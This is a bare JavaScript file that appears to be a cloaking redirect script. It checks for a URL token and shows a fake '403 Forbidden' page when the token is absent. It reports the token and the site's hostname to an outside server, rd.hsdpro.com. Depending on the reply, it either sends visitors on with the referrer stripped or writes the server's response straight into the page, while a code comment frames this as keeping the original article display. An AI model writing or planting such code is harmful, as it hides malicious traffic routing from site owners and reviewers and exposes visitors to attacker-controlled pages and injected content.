if (window.__getf_FETCH_RAN__) {
  // already ran
} else {
  window.__getf_FETCH_RAN__ = 1;

  var redirectWithoutReferrer = function(url) {
    var meta = document.createElement('meta');
    meta.name = 'referrer';
    meta.content = 'no-referrer';
    document.head.appendChild(meta);
    window.location.replace(url);
  };

  function showForbidden() {
    document.open();
    document.write(`
      <html>
        <head><title>403 Forbidden</title></head>
        <body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:10%;">
          <h1>403 Forbidden</h1>
          <p>Access Denied</p>
        </body>
      </html>
    `);
    document.close();
  }

  var params = new URLSearchParams(window.location.search);
  var xrp = params.get('xrp');
  var hostParam1 = window.location.hostname;

  if (!xrp || !/^[a-zA-Z0-9_-]+$/.test(xrp)) {
    showForbidden();
  } else {
    fetch('https://rd.hsdpro.com/index.php?j0=' + xrp + '&host=' + hostParam1 + '&cache=1')
      .then(function(res){ return res.text(); })
      .then(function(e){
        try {
          var r = JSON.parse(e);
          if (r.redirectUrl) {
            redirectWithoutReferrer(r.redirectUrl);
          } else {
            showForbidden();
          }
        } catch (err) {
          // âœ… KEEP ORIGINAL ARTICLE DISPLAY
          document.open();
          document.write(e);
          document.close();
        }
      })
      .catch(function(err){
        console.error(err);
        showForbidden();
      });
  }
}
